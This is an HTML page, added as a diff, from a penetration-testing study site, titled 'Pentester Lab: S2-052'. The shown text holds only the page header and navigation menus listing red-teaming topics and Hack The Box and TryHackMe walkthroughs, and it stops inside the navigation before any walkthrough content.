@@ -1,0 +1,2191 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.1, mkdocs-material-7.1.9">
+    
+    
+      
+        <title>Pentester Lab: S2-052 - LeeCyberSec</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ca7ac06f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.f1a3b89f.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#000000">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}</style>
+      
+    
+    
+    
+    
+      
+
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="">
+  
+    
+    <script>function __prefix(e){return new URL("../../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#pentester-lab-s2-052" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../index.html" title="LeeCyberSec" class="md-header__button md-logo" aria-label="LeeCyberSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            LeeCyberSec
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Pentester Lab: S2-052
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../../../index.html" class="md-tabs__link">
+      Home
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../red-teaming/index.html" class="md-tabs__link">
+        Red Teaming
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../penetration-testing/index.html" class="md-tabs__link">
+        Penetration Testing
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../index.html" class="md-tabs__link md-tabs__link--active">
+        Walkthrough
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../blue-teaming/index.html" class="md-tabs__link">
+        Blue Teaming
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../../../about/index.html" class="md-tabs__link">
+      About Me
+    </a>
+  </li>
+
+      
+    </ul>
+  </div>
+</nav>
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../index.html" title="LeeCyberSec" class="md-nav__button md-logo" aria-label="LeeCyberSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    LeeCyberSec
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../index.html" class="md-nav__link">
+        Home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      <label class="md-nav__link" for="__nav_2">
+        Red Teaming
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Red Teaming" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Red Teaming
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/index.html" class="md-nav__link">
+        __index__
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" >
+      
+      <label class="md-nav__link" for="__nav_2_2">
+        Unix System
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Unix System" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          Unix System
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/unix-system/filesystem.html" class="md-nav__link">
+        Filesystem
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/unix-system/commands.html" class="md-nav__link">
+        Commands
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/unix-system/services.html" class="md-nav__link">
+        Services
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/unix-system/scripting.html" class="md-nav__link">
+        Scripting
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/unix-system/terminal.html" class="md-nav__link">
+        Terminal
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/antivirus-evasion/index.html" class="md-nav__link">
+        Antivirus Evasion
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_4" type="checkbox" id="__nav_2_4" >
+      
+      <label class="md-nav__link" for="__nav_2_4">
+        Exploit Development
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Exploit Development" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_4">
+          <span class="md-nav__icon md-icon"></span>
+          Exploit Development
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/exploit-dev/buffer-overflow/index.html" class="md-nav__link">
+        Buffer Overflow
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/exploit-dev/metasploit-framework/index.html" class="md-nav__link">
+        Metasploit Framework
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/exploit-dev/nse-script/index.html" class="md-nav__link">
+        Nmap Scripting Engine
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/malware-development/index.html" class="md-nav__link">
+        Malware development
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/powershell-empire/index.html" class="md-nav__link">
+        Powershell Empire
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      <label class="md-nav__link" for="__nav_3">
+        Penetration Testing
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Penetration Testing" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Penetration Testing
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/index.html" class="md-nav__link">
+        __index__
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2" type="checkbox" id="__nav_3_2" >
+      
+      <label class="md-nav__link" for="__nav_3_2">
+        External & Internal
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="External & Internal" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_2">
+          <span class="md-nav__icon md-icon"></span>
+          External & Internal
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_1" type="checkbox" id="__nav_3_2_1" >
+      
+      <label class="md-nav__link" for="__nav_3_2_1">
+        Reconnaissance
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Reconnaissance" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          Reconnaissance
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/reconnaissance/infor-gathering.html" class="md-nav__link">
+        Info Gathering
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/reconnaissance/active-scanning.html" class="md-nav__link">
+        Active Scanning
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_2" type="checkbox" id="__nav_3_2_2" >
+      
+      <label class="md-nav__link" for="__nav_3_2_2">
+        Common Services
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Common Services" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          Common Services
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/general.html" class="md-nav__link">
+        general
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/ftp-21.html" class="md-nav__link">
+        ftp 21
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/smtp-25.html" class="md-nav__link">
+        smtp 25
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/dns-53.html" class="md-nav__link">
+        dns 53
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/pop3-110.html" class="md-nav__link">
+        pop3 110
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/nfs-111.html" class="md-nav__link">
+        nfs 111
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/smb-139-445.html" class="md-nav__link">
+        smb 139,445
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/snmp-161.html" class="md-nav__link">
+        snmp 161
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/mssql-1443.html" class="md-nav__link">
+        mssql 1443
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/mysql-3306.html" class="md-nav__link">
+        mysql 3306
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/postgresql-5432.html" class="md-nav__link">
+        postgresql 5432
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/mongodb-27017.html" class="md-nav__link">
+        mongodb 27017
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_3" type="checkbox" id="__nav_3_2_3" >
+      
+      <label class="md-nav__link" for="__nav_3_2_3">
+        Remote Exploitation
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Remote Exploitation" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_3">
+          <span class="md-nav__icon md-icon"></span>
+          Remote Exploitation
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/remote-exploitation/Unix%26Linux.html" class="md-nav__link">
+        Unix&Linux
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/remote-exploitation/windows.html" class="md-nav__link">
+        Windows
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/file-transfer/index.html" class="md-nav__link">
+        File Transfer
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/password-attack/index.html" class="md-nav__link">
+        Password Attack
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/port-redirection-tunneling/index.html" class="md-nav__link">
+        Redirec & Tunnel
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_7" type="checkbox" id="__nav_3_2_7" >
+      
+      <label class="md-nav__link" for="__nav_3_2_7">
+        Privilege Escalation
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Privilege Escalation" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_7">
+          <span class="md-nav__icon md-icon"></span>
+          Privilege Escalation
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html" class="md-nav__link">
+        Unix Enumeration
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html" class="md-nav__link">
+        Unix Escalation
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html" class="md-nav__link">
+        Windows Enumeration
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/privilege-escalation/common-escal/Windows.html" class="md-nav__link">
+        Windows Escalation
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_3" type="checkbox" id="__nav_3_3" >
+      
+      <label class="md-nav__link" for="__nav_3_3">
+        Active Directory
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Active Directory" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_3">
+          <span class="md-nav__icon md-icon"></span>
+          Active Directory
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/active-directory/enumeration.html" class="md-nav__link">
+        Enumeration
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/active-directory/authentication.html" class="md-nav__link">
+        Authentication
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/active-directory/lateral-movement.html" class="md-nav__link">
+        Lateral Movement
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/active-directory/persistent.html" class="md-nav__link">
+        Persistent
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_4" type="checkbox" id="__nav_3_4" >
+      
+      <label class="md-nav__link" for="__nav_3_4">
+        Web Application
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Web Application" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_4">
+          <span class="md-nav__icon md-icon"></span>
+          Web Application
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/web-application/enumeration.html" class="md-nav__link">
+        Enumeration
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/web-application/exploitation.html" class="md-nav__link">
+        Exploitation
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/mobile-application/index.html" class="md-nav__link">
+        Moble Application
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/wireless-rfid/index.html" class="md-nav__link">
+        Wireless & RFID
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/social-engineering/index.html" class="md-nav__link">
+        Social Engineering
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
+      
+      <label class="md-nav__link" for="__nav_4">
+        Walkthrough
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Walkthrough" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Walkthrough
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../index.html" class="md-nav__link">
+        __index__
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2" type="checkbox" id="__nav_4_2" >
+      
+      <label class="md-nav__link" for="__nav_4_2">
+        Hack The Box
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Hack The Box" data-md-level="2">
+        <label class="md-nav__title" for="__nav_4_2">
+          <span class="md-nav__icon md-icon"></span>
+          Hack The Box
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Lame/index.html" class="md-nav__link">
+        HTB Lame
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Legacy/index.html" class="md-nav__link">
+        HTB Legacy
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Devel/index.html" class="md-nav__link">
+        HTB Devel
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Popcorn/index.html" class="md-nav__link">
+        HTB Popcorn
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Beep/index.html" class="md-nav__link">
+        HTB Beep
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Optimum/index.html" class="md-nav__link">
+        HTB Optimum
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Bastard/index.html" class="md-nav__link">
+        HTB Bastard
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Cronos/index.html" class="md-nav__link">
+        HTB Cronos
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Blue/index.html" class="md-nav__link">
+        HTB Blue
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Nineveh/index.html" class="md-nav__link">
+        HTB Nineveh
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Shocker/index.html" class="md-nav__link">
+        HTB Shocker
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Bashed/index.html" class="md-nav__link">
+        HTB Bashed
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Nibbles/index.html" class="md-nav__link">
+        HTB Nibbles
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Jerry/index.html" class="md-nav__link">
+        HTB Jerry
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Bastion/index.html" class="md-nav__link">
+        HTB Bastion
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Tabby/index.html" class="md-nav__link">
+        HTB Tabby
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/ServMon/index.html" class="md-nav__link">
+        HTB ServMon
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Canape/index.html" class="md-nav__link">
+        HTB Canape
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackthebox/Help/index.html" class="md-nav__link">
+        HTB Help
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3" type="checkbox" id="__nav_4_3" >
+      
+      <label class="md-nav__link" for="__nav_4_3">
+        TryHackMe
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="TryHackMe" data-md-level="2">
+        <label class="md-nav__title" for="__nav_4_3">
+          <span class="md-nav__icon md-icon"></span>
+          TryHackMe
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tryhackme/MrRobot/index.html" class="md-nav__link">
+        Mr Robot
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tryhackme/Thompson/index.html" class="md-nav__link">
+        Thompson
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tryhackme/Kenobi/index.html" class="md-nav__link">
+        Kenobi
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tryhackme/Ignite/index.html" class="md-nav__link">
+        Ignite
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tryhackme/SteelMountain/index.html" class="md-nav__link">
+        Steel Mountain
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tryhackme/HackPark/index.html" class="md-nav__link">
+        HackPark
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+    
+  
+  
+    
